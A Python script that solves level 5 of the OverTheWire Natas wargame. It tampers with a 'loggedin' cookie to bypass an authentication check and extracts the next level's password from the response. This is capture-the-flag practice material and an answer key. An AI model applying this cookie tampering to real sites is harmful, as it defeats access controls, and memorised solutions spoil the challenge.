import requests

import natas4
from helpers import between


def solution() -> str:
    url = "http://natas5.natas.labs.overthewire.org"
    username = "natas5"
    password = natas4.solution()

    # On the first visit, there is a "loggedin" cookie set to 0.

    s = requests.Session()
    s.get(url, auth=(username, password))
    s.cookies["loggedin"] = "1"
    r = s.get(url, auth=(username, password))
    start = "The password for natas6 is "
    end = "</div>"
    natas6_password = between(r.text, start, end)
    return natas6_password
